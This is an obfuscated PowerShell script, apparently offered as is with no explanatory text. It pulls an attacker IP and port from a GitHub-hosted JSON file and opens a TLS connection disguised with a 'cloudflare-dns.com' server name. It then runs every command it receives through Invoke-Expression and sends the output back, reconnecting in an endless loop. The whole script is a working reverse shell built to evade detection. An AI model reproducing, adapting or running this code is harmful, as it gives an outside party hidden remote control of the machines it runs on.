$ONY      =            [type](     'S'      +      'Y'       +            'SteM.tE'    +          'X'       +      't.E'       +     'ncODiNG'     )      ;          function d`N`SLOokup(      ${DN`SRe`cord}         ){
    ${r`e`s`ponsE}       =       (                &        (         'Inv'      +     'o'       +       'ke-'        +        'WebR'   +        'equest'    ) (        (    (     'h'        +         (     't'    +           'tps'       )  +         ':/'     )            +         '/1'     +     '.1'   +    (     (       '.'       +          '1.1/'        )      +      'dn'        )     +   (    's'    +       (     '-q'      +     'uer'        )    +       'y?'      )   +       (        'n'     +        (        'am'    +      'e'      )       )      +        '='      +       (        (      'po'         +     'w'       )          +    'e'        )   +        (       (        'rs'         +     'he'    )       +      (      'l'        +         'l-re'     )        +     've'      )          +        'r'         +      (    (        's'        +     'e-'       )        +       's'      )     +      (       (           'he'        +       'll'        )   +         '.'       )  +    'd'        +        'e'          +       'm'      +        'o'       +      (        '.'   +     'ex'       +     (         'a'         +      'mp'    )      )      +       'l'      +         (        (       'e'         +      '.com'         )         +         (       '&t'    +       'y'          )      +       'p'         )         +    'e'        +    '='       )        +        ${D`NS`REcoRd}    ) -Headers @{(     (           'ac'     +    'c'      )      +      (     'ep'          +   't'        )      )     = (     (           (       'app'          +          'li'      )     +      'c'         )      +   (          (        'at'         +        'i'        )       +             (      'on'     +      '/'       )         ) +           'dn'      +       's'        +        (        (          '-'        +        'js'     )        +    'on'         )      )}         )."C`O`NTeNt"
    return (          (            get-vaRIAbLE onY -ValUe          )::"Ut`F8"."GeT`Str`I`NG"(          ${rE`Sp`ONSE}         )      |                 &          (        'Conv'     +      'ertFr'         +     'om-J'             +         's'      +         'on'      )    )."a`NS`WER"."d`ATA".(      'tr'    +        'im'      )."In`V`oKE"(     '"'        )
}

${J}           =              &        (       'Invoke-'     +      'RestMe'       +       'th'        +      'od'        ) -Uri (       'ht'       +            't'         +          (       (   'ps:/'      +        '/'      )         +    (         'gi'  +       't'          )     )    +        (          'hu'      +              'b'     )      +     '.'    +       (     'co'         +         (   'm'           +          '/So'     )        )         +        (       'u'     +       (     'myo0'      +       '0'      )       )       +      (       (      '1'         +     '/pro'       )   +        'g'       )        +          're'           +       (       (             's'        +           'si'        )        +     (   've'   +     '_'    )          )        +     '0v'         +      'e'      +        'rl'            +     'o'         +        (         'ad'    +     '/'       )           +     (      'r'         +       (        'aw/re'      +         'f'          )     )       +     's'     +         (          '/'      +       (       'he'          +          'a'       )        )      +      (      'd'   +         's/'     +         (          'm'      +  'ain'         +      '/p'           )       )        +      (       'a'          +        (    'y'   +       'lo'        )    )     +         'a'        +          'ds'       +    (         '/'      +          'ip'       )       +       (     ( '_p'        +       'ort'          )       +     '.'  )       +      'j'       +       (          'so'        +    'n'       )     )

${RE`mO`TEiP}       =         ${j}."I`p"
${r`emoTEP`Ort}        =           ${J}."p`OrT"

while (       ${t`RUe}        ) {
    do {
               .        (         'Star'          +       't-'     +            'Sleep'     ) -Seconds 1
        try{
            ${tCpc`onnEcT`i`oN}      =                     .       (      'N'       +          'ew'           +      '-Object'     ) (          'Syst'      +        'e'      +        'm'       +      '.Net.Sock'     +      'ets.'       +         'TcpClie'       +       'nt'         )(       ${re`MotE`Ip}, ${ReM`o`Te`PorT}        )
        }catch{}
    } until (        ${tCp`c`oNnE`ctiON}."Co`NN`ectEd"       )

    try {
        ${nEtworK`ST`REaM}        =   ${TC`P`coNNE`C`TiON}.(       'Get'        +         'Strea'    +       'm'       )."InvO`Ke"(                )
        ${s`s`Ls`TReaM}         =                &         (        'N'   +      'ew-O'     +        'bject'      ) (     'Sy'         +    's'        +    'te'     +       'm.'         +    'N'   +    'et.Secu'         +      'rity.SslStream'   )(        ${N`ETW`o`RkSTrE`Am}, ${FA`LSe}, (           {${T`RUE}} -as [System.Net.Security.RemoteCertificateValidationCallback]          )         )
        ${SsL`St`REaM}.(       'A'      +        'uth'        +       'e'  +        'nti'     +   'c'        +         'ateAsClien'     +         't'      )."i`Nv`OKe"(           (     'cl'           +     (      'o'       +     'ud'      )         +       (   'f'        +       'la'      +    (    're'      +         '-d'           +       'ns'         )   )      +        (       '.c'        +         'om'           )      ), ${nU`lL}, ${fa`l`SE}        )
        
        if (       !${SS`lsTr`Eam}."i`SA`UTHenTI`C`AtEd" -or !${s`Slst`REaM}."iS`s`iGnEd"         ) {
            ${ss`Lst`ReAM}.(       'Clos'       +      'e'        )."INV`OkE"(            )
            ${T`cP`C`OnNECTiOn}.(     'C'     +      'lose'            )."i`Nvoke"(        )
            continue
        }


        ${Str`EA`mwrIT`Er}           =                &        (      'New-Ob'         +       'j'     +        'ect'          ) (      'Syst'         +   'em.'        +      'IO.StreamWr'       +      'ite'     +        'r'       )(      ${sS`LST`Re`Am}       )

        function W`RITeSTreaM`To`s`Er`VER(          ${str`InG}      ){
            [byte[]]${S`Cr`i`pt:bUffER}        =          0..${t`cPco`NNe`c`TION}."ReCeivebuF`F`ER`SIZE"          |                .          (    '%'            ) {0}
            ${stR`ea`m`wriTEr}.(      'W'      +       'rite'    )."In`VO`ke"(       ${sTR`iNG}        +      (       'SH'         +          (   'E'      +  (       'LL'      +      ' '        )       )           )         +        (               .       (     'Get'         +        '-'            +       'L'      +            'ocation'       )       )."pa`Th"        +        (      ' :'       +         '>'      )      )
            ${stREAmw`R`iter}.(        'Flus'          +      'h'        )."I`NvOke"(          )
        }

                  .      (       'writeSt'     +      'r'        +         'eam'          +       'ToServer'    ) ''

        while (    (      ${ByTE`s`R`ead}       =        ${sSls`T`Ream}.(      'R'           +  'ead'      )."iNv`okE"(       ${ScRI`PT:BUF`FEr}, 0, ${SC`RIPT:`B`U`FFeR}."L`ength"     )     ) -gt 0             ) {
        
            ${cO`mMa`Nd}       =          (       itEm  (         'v'    +        'ariA'         +          'BL'    +     'E:ONy'         )       ).VALUe::"UT`F8"."GetstR`i`Ng"(        ${sCripT`:bu`FF`Er}, 0, ${By`Tes`R`ead} - 1       )
        
            ${Co`MMa`N`D_OutP`UT}      =          try {
                        .        (     'Invoke-'           +         'Expr'       +           'e'          +     'ssi'    +      'on'     ) ${coMMA`Nd} 2>&1           |                &       (         'Ou'       +    't-St'      +      'ring'         )
            }
            catch {
                ${_}      |                       &       ( 'Out'        +        '-'        +        'String'        )
            }
                .        (          'wri'         +      'teStre'       +      'am'       +     'To'          +         'Serve'         +       'r'   )(        ${c`ommAn`D`_ouTPut}        )
        }
        ${stRe`Am`wRI`T`Er}.(     'C'       +          'lose'      )."i`NVoke"(             )
        ${SS`lS`T`REaM}.(     'Clo'      +       'se'      )."i`N`VOKE"(                  )
        ${tCp`CONne`CtIOn}.(    'Clos'      +     'e'          )."In`Voke"(                 )
    }
    catch {
        if (    ${St`R`eA`mwRITER}        ) { ${ST`REA`mw`RitER}.(          'Cl'     +       'ose'     )."INV`OKe"(              ) }
        if (        ${ssL`STr`E`Am}       ) { ${SSlStR`E`AM}.(          'Clos'       +        'e'         )."InV`OkE"(         ) }
        if (       ${TCPcoN`Ne`cT`ioN}     ) { ${tcp`cO`NNEc`TioN}.(        'Clo'     +      'se'       )."INvo`ke"(              ) }
    }

           &    (             'Sta'     +         'r'  +    't-Sle'           +       'ep'           ) -Seconds 5
}